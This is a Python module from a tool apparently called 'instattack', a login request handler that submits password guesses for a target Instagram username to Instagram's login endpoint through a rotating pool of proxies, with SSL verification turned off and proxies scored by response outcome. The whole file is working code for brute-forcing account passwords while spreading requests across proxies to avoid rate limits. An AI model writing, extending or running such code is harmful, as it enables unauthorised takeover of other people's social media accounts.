import aiohttp
import asyncio
import ssl

from instattack import logger
from instattack.conf import settings

from instattack.src.exceptions import ClientResponseError
from instattack.src.base import Handler
from instattack.src.login import constants

from .exceptions import InvalidResponseJson, InstagramResultError
from .models import InstagramResult
from .utils import get_token


log = logger.get_async('Login Handler')


"""
TODO:
----
Look into asyncio.shield() for database transactions.

ClientSession
-------------
When ClientSession closes at the end of an async with block (or through
a direct ClientSession.close() call), the underlying connection remains
open due to asyncio internal details. In practice, the underlying
connection will close after a short while. However, if the event loop is
stopped before the underlying connection is closed, an ResourceWarning:
unclosed transport warning is emitted (when warnings are enabled).

To avoid this situation, a small delay must be added before closing the
event loop to allow any open underlying connections to close.
<https://docs.aiohttp.org/en/stable/client_advanced.html>
"""


class RequestHandler(Handler):

    def __init__(self, config, proxy_handler, **kwargs):
        super(RequestHandler, self).__init__(**kwargs)
        self.proxy_handler = proxy_handler

        self._headers = None
        self._cookies = None
        self._token = None

        self.limit = config['connection']['limit']
        self.timeout = config['connection']['timeout']
        self.limit_per_host = config['connection']['limit_per_host']

    @property
    def _connector(self):
        return aiohttp.TCPConnector(
            ssl=False,
            force_close=True,
            limit=self.limit,
            limit_per_host=self.limit_per_host,
            enable_cleanup_closed=True,
        )

    @property
    def _timeout(self):
        return aiohttp.ClientTimeout(
            total=self.timeout
        )

    def _login_data(self, password):
        return {
            constants.INSTAGRAM_USERNAME_FIELD: self.user.username,
            constants.INSTAGRAM_PASSWORD_FIELD: password
        }

    @property
    def headers(self):
        return self._headers

    @property
    def token(self):
        return self._token

    async def cookies(self):
        if not self._cookies:
            # TODO: Set timeout to the token timeout.
            sess = aiohttp.ClientSession(connector=self._connector)
            self._token, self._cookies = await get_token(sess)

            if not self._token:
                raise RuntimeError('Could not find token.')

            self._headers = settings.HEADERS(self._token)
            await sess.close()

        return self._cookies

    async def parse_response_result(self, result, context):
        """
        Raises an exception if the result that was in the response is either
        non-conclusive or has an error in it.

        If the result does not have an error and is non conslusive, than we
        can assume that the proxy was most likely good.
        """
        result = InstagramResult.from_dict(result, context)
        if result.has_error:
            raise InstagramResultError(result.error_message)
        else:
            if not result.conclusive:
                raise InstagramResultError("Inconslusive result.")
            return result

    async def handle_client_response(self, response, context, log):
        """
        Takes the AIOHttp ClientResponse and tries to return a parsed
        InstagramResult object.

        For AIOHttp sessions and client responses, we cannot read the json
        after response.raise_for_status() has been called.

        Since a 400 response will have valid json that can indicate an authentication,
        via a `checkpoint_required` value, we cannot raise_for_status until after
        we try to first get the response json.
        """
        if response.status == 400:
            try:
                json = await response.json()
            except ValueError:
                raise InvalidResponseJson(response)
            else:
                return await self.parse_response_result(json, context)
        else:
            try:
                response.raise_for_status()
            except (
                aiohttp.ClientResponseError,
            ) as e:
                raise ClientResponseError(response)
            else:
                try:
                    json = await response.json()
                except ValueError:
                    raise InvalidResponseJson(response)
                else:
                    return await self.parse_response_result(json, context)

    async def handle_request_error(self, e, proxy, context, log, scheduler):
        """
        AioHTTP Client Exception Reference
        https://docs.aiohttp.org/en/stable/client_reference.html

        ClientError

            These exceptions could happen after we get response from server.
            - ClientResponseError(ClientError)

            These exceptions related to low-level connection problems.
            - ClientConnectionError(ClientError)

                - ServerConnectionError(ClientConnectionError)

                        - ServerDisconnectError(ServerConnectionError)
                        - ServerTimeoutError(ServerConnectionError, asyncio.TimeoutError)

                Subset of connection errors that are initiated by an OSError exception.
                - ClientOSError(ClientConnectionError, OSError)

                    - ClientConnectorError(ClientOSError)

                        - ClientProxyConnectionError(ClientConnectorError)
                        - ClientSSLError(ClientConnectorError) -> Raise Exceptions Here

                            - ClientConnectorCertificateError(ClientSSLError, ssl.SSLError)
                            - ClientConnectorSSLError(ClientSSLError, ssl.CertificateError)
        """
        if isinstance(e, RuntimeError):
            """
            RuntimeError: File descriptor 87 is used by transport
            <_SelectorSocketTransport fd=87 read=polling write=<idle, bufsize=0>>
            """
            log.error(e, extra={'context': context})
            await context.proxy.was_inconclusive(save=False)
            await self.proxy_handler.pool.put(context.proxy)
            scheduler.spawn(context.proxy.save())

        elif isinstance(e, asyncio.CancelledError):
            # Don't want to mark as inconclusive because we don't want to note
            # the last time the proxy was used.
            pass

        elif isinstance(e, (
            aiohttp.ClientProxyConnectionError,
            aiohttp.ServerConnectionError,
            # Not sure why we have to add these even though they should be
            # covered by their parents...
            aiohttp.ClientConnectorError,
            aiohttp.ClientConnectorCertificateError,
            # Not sure why this isn't covered by the aiohttp exceptions but this
            # was causing issues at higher password numbers.
            ssl.SSLError,
        )):
            log.error(e, extra={'context': context})
            await context.proxy.was_error(e, save=False)
            await self.proxy_handler.pool.put(context.proxy)
            scheduler.spawn(context.proxy.save())

        elif isinstance(e, OSError):
            # We have only seen this for the following:
            # >>> OSError: [Errno 24] Too many open files -> Want to sleep
            # >>> OSError: [Errno 54] Connection reset by peer
            if e.errno == 54:
                log.error(e, extra={'context': context})
                # Not sure if we want to treat this as an error or what.
                await context.proxy.was_error(e, save=False)
                await self.proxy_handler.pool.put(context.proxy)
                scheduler.spawn(context.proxy.save())

            elif e.errno == 24:
                log.error(e, extra={
                    'context': context,
                    'other': f'Sleeping for {3} seconds...'
                })
                # Not sure if we want to treat this as an error or what.
                await context.proxy.was_error(e, save=False)
                await self.proxy_handler.pool.put(context.proxy)
                scheduler.spawn(context.proxy.save())
            else:
                raise e

    async def login_request(self, loop, session, context, scheduler):
        """
        For a given password, makes a series of concurrent requests, each using
        a different proxy, until a result is found that authenticates or dis-
        authenticates the given password.
        """
        log = logger.get_async('Requesting Login', subname='login_request')
        log.disable_on_false(self.log_attempts)

        try:
            # Temporarary to make sure things are working properly.
            if not self.headers:
                raise RuntimeError('Headers should be set.')

            async with session.post(
                settings.INSTAGRAM_LOGIN_URL,
                headers=self.headers,
                data=self._login_data(context.password),
                ssl=False,
                proxy=context.proxy.url  # Only Http Proxies Are Supported by AioHTTP
            ) as response:
                try:
                    result = await self.handle_client_response(response, context, log)

                # Temporary to see if this is where errors coming from.
                except ssl.SSLError as e:
                    log.error(e, extra={
                        'response': response,
                        'context': context
                    })

                    await context.proxy.was_error(e, save=False)
                    await self.proxy_handler.pool.put(context.proxy)
                    scheduler.spawn(context.proxy.save())

                # Not sure why we need to catch this both inside and outside of
                # the sesssion, but we do (I think).
                except ClientResponseError as e:
                    log.error(e, extra={
                        'response': response,
                        'context': context
                    })

                    await context.proxy.was_error(e, save=False)
                    await self.proxy_handler.pool.put(context.proxy)
                    scheduler.spawn(context.proxy.save())

                else:
                    if not result:
                        raise RuntimeError("Result should not be None here.")

                    await context.proxy.was_success(save=False)
                    await self.proxy_handler.pool.put(context.proxy)
                    scheduler.spawn(context.proxy.save())

                    return result

        except ClientResponseError as e:
            log.error(e, extra={
                'response': response,
                'context': context
            })

            await context.proxy.was_error(e, save=False)
            await self.proxy_handler.pool.put(context.proxy)
            scheduler.spawn(context.proxy.save())

        # Temporary to see if this is where errors coming from.
        except ssl.SSLError as e:
            log.error(e, extra={
                'response': response,
                'context': context
            })

            await context.proxy.was_error(e, save=False)
            await self.proxy_handler.pool.put(context.proxy)
            scheduler.spawn(context.proxy.save())

        except Exception as e:
            await self.handle_request_error(e, context.proxy, context, log, scheduler)
